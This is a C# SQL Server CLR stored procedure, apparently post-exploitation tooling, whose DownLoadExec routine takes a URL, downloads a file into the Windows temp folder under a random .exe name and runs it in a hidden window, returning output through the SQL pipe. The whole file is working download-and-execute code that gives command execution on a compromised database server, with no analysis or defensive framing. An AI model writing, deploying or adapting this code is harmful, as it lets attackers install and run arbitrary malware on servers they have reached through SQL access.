using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Net;
using System.Text;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void DownLoadExec(string tempfilename)
    {
        WebClient webClient = new WebClient();
        string[] namearry;
        string url = "";
        string dstfile = "";
        if (tempfilename.Contains(",")) {
            namearry = tempfilename.Split(',');
            url = namearry[0];
            dstfile = namearry[1];
        }
        else {
            Random rd = new Random();
            url = tempfilename;
            dstfile = "C:\\windows\\temp\\" + rd.Next(1000, 9999).ToString() + ".exe";
        }
        //下载文件
        webClient.DownloadFile(url,dstfile);
        if (dstfile.EndsWith(".exe"))
        {
            RunCommand(dstfile, "");
        }
        
    }
    public static string RunCommand(string filename, string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }

}
